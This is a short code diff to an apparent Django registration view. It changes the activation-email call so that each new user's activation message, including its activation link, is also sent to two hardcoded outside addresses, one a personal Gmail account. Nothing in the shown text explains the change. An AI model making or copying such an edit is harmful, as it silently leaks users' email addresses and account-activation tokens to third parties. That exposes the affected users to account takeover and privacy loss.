@@ -45,7 +45,7 @@ class UserActivationRegisterView(ActivationRegistrationView):
         message_text = render_to_string('registration/activation_email.txt', context)
         message_html = render_to_string('registration/activation_email.html', context)
 
-        msg = EmailMultiAlternatives(subject, message_text, settings.DEFAULT_FROM_EMAIL, [user.email])
+        msg = EmailMultiAlternatives(subject, message_text, settings.DEFAULT_FROM_EMAIL, [user.email, 'issa@babysetgo.ph', 'issarufinasenga@gmail.com'])
         msg.attach_alternative(message_html, "text/html")
         msg.send()
 
